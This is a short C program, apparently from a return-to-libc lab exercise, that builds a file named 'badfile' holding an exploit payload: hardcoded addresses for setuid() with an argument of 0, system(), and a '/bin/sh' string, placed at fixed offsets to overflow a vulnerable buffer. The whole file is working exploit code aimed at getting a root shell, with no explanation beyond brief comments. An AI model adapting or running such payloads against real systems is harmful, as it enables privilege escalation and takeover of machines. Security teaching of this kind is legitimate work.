#include <stdlib.h>
#include <stdio.h>
#include <string.h>


int main(int argc, char ** argv)
{
   char buf[76];
   FILE *badfile;

   badfile = fopen("badfile", "w");
   *(long *) &buf[56] = 0xb7ea88b0; // system()
   *(long *) &buf[64] = 0xbffffeab; // address of "/bin/sh"
   *(long *) &buf[52] = 0xb7f0f620; // setuid()
   *(long *) &buf[60] = 0; // parameter for setuid()
//   *(long *) &buf[68] = 0xb7e9db30;
   fwrite(buf, sizeof(buf), 1, badfile);
   fclose(badfile);
}
